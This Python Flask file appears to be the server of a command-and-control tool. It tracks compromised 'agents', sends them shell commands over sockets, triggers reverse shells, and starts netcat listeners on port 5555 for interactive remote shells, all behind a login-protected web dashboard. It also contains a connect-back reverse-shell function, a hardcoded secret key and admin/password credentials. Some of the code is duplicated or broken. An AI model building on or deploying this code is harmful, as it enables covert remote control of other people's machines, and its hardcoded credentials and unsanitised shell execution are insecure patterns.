from flask import Flask, render_template, request, redirect, url_for, jsonify, flash
import socket
import time
import threading
from flask_socketio import SocketIO, send, emit
from flask_login import LoginManager, login_required, UserMixin, login_user, logout_user
from flask import redirect, url_for, session, flash, g
from flask_login import logout_user
from flask import render_template
import subprocess
import logging
import os
import select
import pty
import signal
import os
logging.basicConfig(filename='server.log', level=logging.DEBUG)
import eventlet
eventlet.monkey_patch()



app = Flask(__name__)
socketio = SocketIO(app, async_mode='eventlet')
app.secret_key = ');J,5kg4n{@;W5moK;.^1,I%Ti~oAIr@WaYpnXrV1JolOLKd-c'  # <-- Add this line


clients = {}  # Dictionary to keep track of connected clients
nc_process = None
listener_thread = None


BUFFER_SIZE = 4096

PING_INTERVAL = 10  # seconds
PING_TIMEOUT = 15  # seconds

reverse_shell_thread = None

# Define the subprocess instance globally
p = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)


@socketio.on('connect', namespace='/interactive_reverse_shell')
def reverse_shell_connect():
    while True:
        try:
            output = p.stdout.read()
            socketio.emit('output', output, namespace='/interactive_reverse_shell')

        except:
            break
    p.kill()

def get_agent_by_id(agent_id):
    # Logic to fetch the agent by its ID. This could be from a database or a list.
    # Example:
    for agent in agents:  # Assuming agents is a list of available agents.
        if agent.id == agent_id:
            return agent
    return None

@socketio.on('reverse_shell_command', namespace='/interactive_reverse_shell')
def handle_reverse_shell_command(data):
    session_id = data['session_id']
    command = data['command']

    # Get the agent based on the session ID
    agent = get_agent_by_id(session_id)  # You need to implement this function

    if not agent:
        send("Agent not found!", namespace='/interactive_reverse_shell')
        return

    # Execute the command using pty
    master, slave = pty.openpty()
    agent.execute_command(command, stdout=slave, stderr=slave)

    # Get the output and send it to the frontend
    output = os.read(master, 1024).decode()
    send({'message': output}, namespace='/interactive_reverse_shell')

# Modify the 'command' event listener to handle interactive shell commands
@socketio.on('reverse_shell_command', namespace='/interactive_reverse_shell')
def reverse_shell_command(data):
    global clients

    session_id = data.get('session_id')
    command = data.get('command')

    target_agent = next((agent for agent in clients.values() if agent['id'] == session_id), None)
    if target_agent and target_agent['socket']:
        try:
            # Send the interactive shell command to the client
            target_agent['socket'].sendall(f"shell_command:{command}\n".encode('utf-8'))
        except Exception as e:
            print(f"Error sending interactive shell command: {e}")
    else:
        print(f"Session '{session_id}' not found or socket not available.")

@socketio.on('connect', namespace='/interactive_reverse_shell')
def client_connected():
    if is_listener_active:
        emit('start_listener')


@socketio.on('connect', namespace='/interactive_reverse_shell')
def shell_connect():
    inputs = [p.stdout, p.stderr]
    while True:
        try:
            readable, _, _ = select.select(inputs, [], [])
            for source in readable:
                if source == p.stdout:
                    output = p.stdout.read()
                    emit('output', output.decode())
                elif source == p.stderr:
                    error = p.stderr.read()
                    emit('output', error.decode())
        except:
            break
    p.kill()

@socketio.on('command', namespace='/interactive_reverse_shell')
def shell_command(data):
    global clients

    session_id = data.get('session_id')
    command = data.get('command')

    target_agent = next((agent for agent in clients.values() if agent['id'] == session_id), None)
    if target_agent and target_agent['socket']:
        try:
            target_agent['socket'].sendall(command.encode('utf-8'))
        except Exception as e:
            print(f"Error sending command: {e}")
    else:
        print(f"Session '{session_id}' not found or socket not available.")


def start_reverse_shell_from_server(connect_back_ip, connect_back_port):
    import subprocess
    import socket

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((connect_back_ip, connect_back_port))
    s.sendall("Reverse Shell Connected\n".encode('utf-8'))
    proc = subprocess.Popen(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())

    proc.communicate()

@app.route('/initiate_reverse_shell', methods=['POST'])
def initiate_reverse_shell():
    # Get the agent_id from the form data
    agent_id = request.form.get('agent_id')
    
    reverse_shell_commands[agent_id] = "start_reverse_shell"
    logging.debug(f"Reverse shell command set for agent: {agent_id}")
    
    
    flash('Reverse shell command was sent!', 'success')
    
    # Redirect back to the send_command page
    return redirect(url_for('send_command'))


@app.route('/confirmation')
def your_view_function():
    return "Reverse shell command was sent!"


reverse_shell_commands = {}  # Dictionary to store commands for initiating reverse shell
listener_commands = {}  # Dictionary to store commands for starting listener

# @socketio.on('connect', namespace='/interactive_reverse_shell')
# def shell_socket(ws):
#     p = subprocess.Popen(["/bin/sh"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
#     inputs = [ws, p.stdout, p.stderr]
#     #socketio.emit('start_listener', namespace='/interactive_reverse_shell')

#     while True:
#         try:
#             readable, _, _ = select.select(inputs, [], [])
#             for source in readable:
#                 if source == ws:
#                     command = ws.receive()
#                     p.stdin.write(command.encode() + b'\n')
#                     p.stdin.flush()
#                 elif source == p.stdout:
#                     output = p.stdout.read()
#                     ws.send(output)
#                 elif source == p.stderr:
#                     error = p.stderr.read()
#                     ws.send(error)
#         except:
#             break
#     p.kill()


def handle_reverse_shell_interaction(client_socket):
    try:
        while True:
            client_input = client_socket.recv(BUFFER_SIZE).decode('utf-8')
            if not client_input:
                break
            
            if client_input.lower() == "exit":
                break
            
            # Handle the client input (execute command, etc.)
            # Send response back to client_socket if needed
    except Exception as e:
        logging.error(f"Error during reverse shell interaction: {e}")
    finally:
        client_socket.close()



def handle_client(client_socket, address):
    global clients
    global commands

    agent_id = f"Agent_{address[1]}"
    agent_info = {
        'id': agent_id,
        'ip': address[0],
        'socket': client_socket,
        'last_seen': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()),
        'status': 'active',
        'data': ''
    }

    data = client_socket.recv(BUFFER_SIZE).decode('utf-8')
    agent_info['data'] = data
    clients[address] = agent_info
    logging.info(f"New connection from {address}")

    while True:
        try:
            command = reverse_shell_commands.get(agent_id, None)
            if command:
                client_socket.send(command.encode())
                if command == "start_reverse_shell":
                    client_socket.sendall("start_reverse_shell".encode('utf-8'))
                    reverse_shell_thread = threading.Thread(target=handle_reverse_shell_interaction, args=(client_socket,))
                    reverse_shell_thread.start()
                    reverse_shell_commands[agent_id] = None
                    continue
            else:
                time.sleep(0.5)
        except Exception as e:
            logging.error(f"Error while handling client {address}: {e}")
            break

    clients[address]['status'] = 'inactive'
    client_socket.close()
    logging.info(f"Connection from {address} closed")








def start_server(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(5)
        logging.info(f"Server started on {host}:{port}")
    

        while True:
            client_socket, address = server_socket.accept()
            thread = threading.Thread(target=handle_client, args=(client_socket, address))
            thread.start()

# Flask-Login setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# In-memory user store. In a real-world scenario, you'd have a database
users = {'admin': {'password': 'password'}}

class User(UserMixin):
    pass

@login_manager.user_loader
def user_loader(username):
    if username not in users:
        return
    user = User()
    user.id = username
    return user

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    
    username = request.form.get('username')
    password = request.form.get('password')
    if username in users and users[username]['password'] == password:
        user = User()
        user.id = username
        login_user(user)
        return redirect(url_for('dashboard'))

    return 'Incorrect username or password', 401

@app.route('/agents')
@login_required
def agents():
    agents_list = list(clients.values())
    logging.info("Clients: %s", agents_list)  # Debugging print statement
    return render_template('agents.html', agents=agents_list)


def some_function_to_compute_total_agents():
    return len(clients)


def count_active_agents():
    return sum(1 for agent in clients.values() if agent['status'] == 'active')


def count_inactive_agents():
    return sum(1 for agent in clients.values() if agent['status'] == 'inactive')


def get_last_connected_agent():
    if clients:
        # Assuming that newer clients are added at the end or have later timestamps
        return list(clients.keys())[-1]
    return None


def get_last_connected_time():
    if clients:
        return clients[get_last_connected_agent()]['last_seen']
    return None

@app.route('/get_agents', methods=['GET'])
def get_agents():
    global clients
    
    agents = []
    
    for address, agent_info in clients.items():
        agent_data = {
            "id": agent_info["id"],
            "name": agent_info["id"], # If you want to use the ID as the name, otherwise change as necessary.
        }
        agents.append(agent_data)
    
    return jsonify({"agents": agents})


@app.route('/dashboard')
def dashboard():
    # Some logic to fetch or compute stats
    total_agents = some_function_to_compute_total_agents()
    last_connected_agent = get_last_connected_agent()
    last_connected_time = get_last_connected_time()
    active_agents = count_active_agents()
    inactive_agents = count_inactive_agents()

    # Send these to the template
    return render_template('dashboard.html', stats={
        'total_agents': total_agents,
        'last_connected_agent': last_connected_agent,
        'last_connected_time': last_connected_time,
        'active_agents': active_agents,
        'inactive_agents': inactive_agents
    })





@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out.', 'success')
    return redirect(url_for('login'))

# Make sure to protect your main route
@app.route('/')
@login_required
def index():
    global clients
    return redirect(url_for('dashboard'))  # Redirect to /dashboard

@app.route('/send_command', methods=['GET', 'POST'])
@login_required
def send_command():
    global clients, reverse_shell_thread

    if 'reverse_shell_thread' not in globals():
        global reverse_shell_thread
        reverse_shell_thread = None
        listener_thread = None

    output = None  # Initialize the output variable here

    if request.method == 'POST':
        action = request.form.get('action', '')
        agent_id = request.form.get('client_address')
        target_address = next((k for k, v in clients.items() if v['id'] == agent_id), None)
        client_socket = None

        if target_address:
            client_socket = clients[target_address]['socket']

        if action == 'start_listener':
            if not listener_commands.get(agent_id):
                listener_commands[agent_id] = "start_listener"
                flash('Listener command sent!', 'success')
            else:
                flash('Listener command is already sent for this agent.', 'warning')
            return redirect(url_for('send_command'))
        
        # if action == 'start_reverse_shell' and client_socket:
        #     reverse_shell_commands[agent_id] = "start_reverse_shell"
        #     flash(f"Reverse shell command sent to {agent_id}.", 'success')
        #     return redirect(url_for('send_command'))
        
    
        # Existing logic for sending commands
        command = request.form.get('command')
        if client_socket and command:
            try:
                client_socket.sendall(command.encode('utf-8'))
                output = client_socket.recv(BUFFER_SIZE).decode('utf-8')

                if request.headers.get('Content-Type') == 'application/json':
                    return jsonify({'output': output})

            except socket.error as e:
                flash(f"Error sending command: {e}", 'error')

    agents = [v for k, v in clients.items()]
    return render_template('send_command.html', agents=agents, output=output)

is_listener_active = False

listener_active = False

@app.route('/listener_status', methods=['GET'])
def listener_status():
    global listener_active
    logging.debug(f'Listener status checked: {"active" if listener_active else "inactive"}')
    return jsonify(status='active' if listener_active else 'inactive')


# def reverse_shell_listener(host, port, listener_thread_stop):
#     global is_listener_active
#     logging.info("Entering reverse_shell_listener...")  # Log entry

#     try:
#         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener_socket:
#             listener_socket.bind((host, port))
#             listener_socket.settimeout(1)  # Set a timeout for the accept call
#             listener_socket.listen(5)
            
#             logging.info(f"Reverse shell listener started on {host}:{port}")

#             is_listener_active = True  # Set the state when listener is active
#             socketio.emit('start_listener', namespace='/interactive_reverse_shell')

#             while not listener_thread_stop.is_set():
#                 try:
#                     client_socket, address = listener_socket.accept()
#                     logging.info(f"Reverse shell connected from {address}")

#                     handle_reverse_shell(client_socket, address)

#                     client_socket.close()
#                     logging.info(f"Reverse shell connection from {address} closed")
#                 except socket.timeout:
#                     # No client connected in the set timeout duration, just loop back and check the event again
#                     pass

#             socketio.emit('clear_listener_output', namespace='/interactive_reverse_shell')

#     except Exception as e:
#         logging.error(f"Error in reverse_shell_listener: {e}")

#     finally:
#         is_listener_active = False  # Reset the state when listener stops
#         logging.info("Exiting reverse_shell_listener...")  # Log exit



def execute_command(command):
    """
    Simulate executing a command and return the output.
    Replace this with your actual command execution logic.
    """
    if command.strip() == "exit":
        return "Connection closed."

    # Use subprocess to execute the command and capture its output
    try:
        import subprocess
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"


def handle_reverse_shell(client_socket, address):
    """
    Handle the reverse shell connection.
    """
    try:
        while True:
            # Receive data from the client (the reverse shell)
            data = client_socket.recv(BUFFER_SIZE).decode('utf-8')
            if not data:
                logging.info(f"Connection from {address} closed")
                break
            
            # Handle the client input (execute command, etc.)
            response = execute_command(data)  # Replace this with your command execution logic
            
            # Send the response back to the client
            client_socket.sendall(response.encode('utf-8'))
    finally:
        client_socket.close()
        logging.info(f"Connection from {address} closed")


# Create the listener_thread_stop event outside of the functions
listener_thread_stop = threading.Event()

@app.route('/start_listener', methods=['GET'])
@login_required
def start_listener():
    global nc_process
    global listener_active
    listener_active = True
    logging.debug('Listener started')

    if nc_process and nc_process.poll() is None:
        flash('Listener is already running.', 'warning')
        # Emit status update to the client
        socketio.emit('listener_status', 'running', namespace='/interactive_reverse_shell')
    else:
        nc_process = subprocess.Popen(["nc", "-lvnp", "5555"],
                                      stdin=slave,
                                      stdout=slave,
                                      stderr=subprocess.PIPE,
                                      universal_newlines=True)
        flash('Netcat listener started!', 'success')
        logging.info("Listener UP")
        # Emit status update to the client
        socketio.emit('listener_status', 'running', namespace='/interactive_reverse_shell')

    os.close(slave)
    return redirect(url_for('interactive_reverse_shell'))








@socketio.on('send_command', namespace='/shell')
def handle_command(command):
    if not nc_process or nc_process.poll() is not None:  
        emit('output', {'message': 'Listener is not active.'})
        return

    cmd = command['cmd']

    # Write the command to the nc's stdin
    os.write(master, (cmd + '\n').encode())

    outputs = []
    while True:
        # Wait for output for up to 0.5 seconds
        rlist, _, _ = select.select([master], [], [], 0.5)
        if rlist:
            line = os.read(master, 1024).decode()
            if line:
                outputs.append(line)
            else:
                break
        else:
            break

    output = ''.join(outputs)
    emit('output', {'message': output})


master, slave = pty.openpty()

@socketio.on('connect', namespace='/interactive_reverse_shell')
def shell_socket(ws):
    global nc_process
    # Start the nc listener via a pseudo-terminal
    pid = os.fork()
    if pid == 0:  # This is executed by the child process
        os.setsid()
        os.dup2(slave, 0)  # Redirect child's stdin
        os.dup2(slave, 1)  # Redirect child's stdout
        os.dup2(slave, 2)  # Redirect child's stderr
        os.execlp("nc", "nc", "-lnvp", "5555")  # Start the nc listener on port 
    else:
        nc_process = subprocess.Popen(["nc", "-lnvp", "5555"], stdin=slave, stdout=slave, stderr=subprocess.PIPE, universal_newlines=True)
        
        # Debugging: Print the value of nc_process
        print("nc_process:", nc_process)

        # Emit listener status to the client
        listener_status = "Listener started" if nc_process else "Listener not started"
        
        # Debugging: Print the listener_status
        print("listener_status:", listener_status)
        
        socketio.emit('listener_status', listener_status, namespace='/interactive_reverse_shell')
        inputs = [ws, master]
        while True:
            try:
                readable, _, _ = select.select(inputs, [], [])
                for source in readable:
                    if source == ws:
                        command = ws.receive()
                        os.write(master, command.encode() + b'\n')
                    elif source == master:
                        output = os.read(master, 1024).decode()
                        ws.send(output)
            except:
                break
        
        # Cleanup
        os.kill(pid, signal.SIGTERM)


@app.route('/stop_listener', methods=['GET'])
def stop_listener():
    global nc_process
    if nc_process and nc_process.poll() is None:
    # kill and wait here

        nc_process.kill()  # Use kill() with appropriate signal
        nc_process.wait()  # Wait for the process to complete
        nc_process = None
        flash('Netcat listener stopped!', 'success')
        logging.info("Listener stopped")
        global listener_active
        listener_active = False
        logging.debug('Listener stopped')
    else:
        flash('Listener is not running.', 'warning')
        logging.info("Listener not running")
    return redirect(url_for('interactive_reverse_shell'))

@socketio.on('input', namespace='/interactive_reverse_shell')
def shell_input(message):
    global current_process
    if not current_process:
        current_process = subprocess.Popen("nc -lnvp 5555", stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True, bufsize=1, universal_newlines=True)
    
    cmd_output, cmd_error = current_process.communicate(input=message['command'])
    response = cmd_output or cmd_error
    emit('output', {'message': response})


@app.route('/interactive_reverse_shell')
@login_required
def interactive_reverse_shell():
    agents_list = list(clients.values())
    return render_template('interactive_reverse_shell.html', agents=agents_list)



if __name__ == '__main__':
    logging.info("Starting server thread...")
    server_thread = threading.Thread(target=start_server, args=('192.168.0.100', 12345))
    server_thread.start()
    


    # logging.info("Starting reverse shell listener thread...")
    # listener_thread = threading.Thread(target=reverse_shell_listener, args=('192.168.0.108', 5555))  # Modify IP and port accordingly
    # listener_thread.start()


    socketio.run(app, host='192.168.0.100', debug=False, port=8080)  # Starting the web interface on port 8080
    server_thread.join()



